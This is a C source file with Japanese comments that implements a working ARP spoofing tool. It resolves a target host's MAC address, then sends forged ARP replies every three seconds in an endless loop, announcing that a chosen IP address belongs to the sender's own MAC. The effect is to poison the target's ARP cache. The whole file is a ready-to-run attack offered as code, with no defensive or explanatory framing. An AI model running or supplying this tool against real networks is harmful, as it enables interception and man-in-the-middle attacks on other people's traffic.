#include "arpspoofing.h"

int create_arp_sock()
{
    int arp_sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (arp_sock < 0)
    {
        perror("arp sock");
        printf("errno: %d\n", errno);
        return 1;
    }
    return arp_sock;
}

void set_if_info(int sock, char *if_name, char* if_ip,unsigned char* if_mac)
{
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_addr.sa_family = AF_INET;
    memcpy(ifr.ifr_name, if_name, 6);
    
    // IPアドレスの取得
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ip addr");
        printf("errno: %d\n", errno);
        return;
    }
    memcpy(if_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), IP_CHAR_LEN);

    // MACアドレスの取得
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("mac addr");
        printf("errno: %d\n", errno);
        return;
    }
    memcpy(if_mac, ifr.ifr_hwaddr.sa_data, 6); 

}

void set_sockaddr(struct sockaddr_ll *sll, char *if_name)
{
    memset(sll, 0x0, sizeof(sll));                  
    sll->sll_family = AF_PACKET;                    /* 常に AF_PACKET */
    sll->sll_protocol = htons(ETH_P_ARP);           /* 物理層のプロトコル */
    sll->sll_ifindex = if_nametoindex(if_name);     /* インターフェース番号 */
    sll->sll_halen = 6;                             /* アドレスの長さ */
    memset(&sll->sll_addr, 0xff, 6);                /* 物理層のアドレス */
}

void set_arp_header(struct ether_arp *arpPacket, unsigned char *s_mac, char *s_ip, unsigned char *t_mac, char *t_ip, int op)
{
    memset(arpPacket, 0x0, sizeof(arpPacket));
    arpPacket->arp_hrd = htons(1);                  /* Format of hardware address.  */
    arpPacket->arp_pro = htons(ETHERTYPE_IP);       /* Format of protocol address.  */
    arpPacket->arp_hln = 6;                         /* Length of hardware address.  */
    arpPacket->arp_pln = 4;                         /* Length of protocol address.  */
    arpPacket->arp_op = htons(op);                  /* ARP opcode (command).  */

    memcpy(arpPacket->arp_sha, s_mac, 6);                       // 送信元MAC
    inet_aton(s_ip, (struct in_addr *)&arpPacket->arp_spa);     // 送信元IP
    memcpy(arpPacket->arp_tha, t_mac, 6);                       // 宛先MAC
    inet_aton(t_ip, (struct in_addr *)&arpPacket->arp_tpa);     // 宛先IP
}

void get_t_mac(int arp_sock, struct ether_arp arpPacket, struct sockaddr_ll sll, int sll_size, char *t_ip, unsigned char *t_mac)
{
    // 指定したIPアドレスのMACアドレスが解決できるまで繰り返す
    while(1)
    {
        if (sendto(arp_sock, (char *)&arpPacket, sizeof(arpPacket),
            0, (struct sockaddr *)&sll, sizeof(sll)) < 0){
            perror("sendto");
            printf("errno: %d\n", errno);
            break;
        }
        char buf[256];
            memset(buf,0x0,sizeof(buf));
            int arp_size = recvfrom(arp_sock, buf, sizeof(buf), 0, NULL, NULL);

            // ARPパケットがきたら
            if(arp_size < 0) {
                printf("errno: %d\n",errno);
            }else{
                struct ether_arp *ether_arp = (struct ether_arp*) buf;
                char ip_address[IP_CHAR_LEN];
                memcpy(ip_address, inet_ntop(AF_INET, ether_arp->arp_spa, ip_address, IP_CHAR_LEN), IP_CHAR_LEN);

                // 指定したIPアドレスのMACアドレスを取得できたら
                if(strcmp((t_ip), ip_address) == 0){
                    memcpy(t_mac, ether_arp->arp_sha, 6);
                    printf("%sのMACアドレス -> ", t_ip); 
                    print_macaddr(t_mac);
                    break;
                }else{
                    printf("%sのMACアドレス取得中...\n", t_ip);
                }

            }
        sleep(3);
    }
}

void char2mac(char* macadd, unsigned char* mac_str){
    char* mac = macadd;
    char temp[3];
    int i;
    for(i = 0; i < 6; i++){
        temp[0] = mac[i * 3 + 0];
        temp[1] = mac[i * 3 + 1];
        temp[2] = 0x00;
        mac_str[i] = strtol(temp, NULL, 16);
    }

}

void print_macaddr(unsigned char* macaddr) 
{
   printf(" %02x:%02x:%02x:%02x:%02x:%02x\n",macaddr[0],macaddr[1],macaddr[2],macaddr[3],macaddr[4],macaddr[5]);
}


void arp_spoofing(char *argv[])
{

    char if_ip[IP_CHAR_LEN];    // 自分のIPアドレス
    unsigned char if_mac[6];    // 自分のMACアドレス
    char t_ip[IP_CHAR_LEN];     // ターゲットホストのIPアドレス
    unsigned char t_mac[6];     // ターゲットホストのMACアドレス
    char fake_ip[IP_CHAR_LEN];  // なりすましたいホストのIP
 
    // ARPソケットの作成
    int arp_sock = create_arp_sock();

    // インターフェース名からのIP,MACアドレスの取得
    set_if_info(arp_sock, argv[1], if_ip, if_mac);

    // ソケットアドレス
    struct sockaddr_ll sll;
    set_sockaddr(&sll, argv[1]);

    // バインド
    if(bind(arp_sock, (struct sockaddr*)&sll, sizeof(sll)) < 0) 
    {
        perror("bind");
        printf("errno: %d\n",errno);
        return;
    }

    //arpパケットの設定(ターゲットホストのMACアドレス取得用)
    char2mac("00:00:00:00:00:00",t_mac);
    memcpy(t_ip, argv[3], IP_CHAR_LEN);
    struct ether_arp arpPacket;
    set_arp_header(&arpPacket, if_mac, if_ip, t_mac, t_ip, ARPOP_REQUEST);

    // ターゲットホストのMACアドレス取得
    get_t_mac(arp_sock, arpPacket, sll, sizeof(sll), t_ip, t_mac);

    //arpパケットの設定(ARPスプーフィング用)
    memcpy(fake_ip, argv[2], IP_CHAR_LEN); 
    set_arp_header(&arpPacket, if_mac, fake_ip, t_mac, t_ip, ARPOP_REPLY);
    int count = 0;

    // ARPスプーフィング
    printf("-------------------------------------------\n");
    printf("Sender MAC : "); print_macaddr(if_mac);
    printf("Sender IP  : %s \n", fake_ip);                             
    printf("Target MAC : "); print_macaddr(t_mac);
    printf("Target IP  : %s \n", t_ip);      
    printf("-------------------------------------------\n");

    while(1){ 
        if (sendto(arp_sock, (char *)&arpPacket, sizeof(arpPacket),
                    0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
        {
            perror("sendto");
            printf("errno: %d\n", errno);
            return;
        }
        printf("%s is at", fake_ip); print_macaddr(if_mac);
        sleep(3);
        count++;
    }

    close(arp_sock);
    return;
}


int main(int argc, char *argv[])
{
    // 引数チェック
    if(argc < 4){
        printf("usage: <if name> <src IP> <dst IP> \n");
        return 0;
    }

    printf("start arp spoofing...\n");
    arp_spoofing(argv);
    printf("arp spoofing succeeded!\n");

}
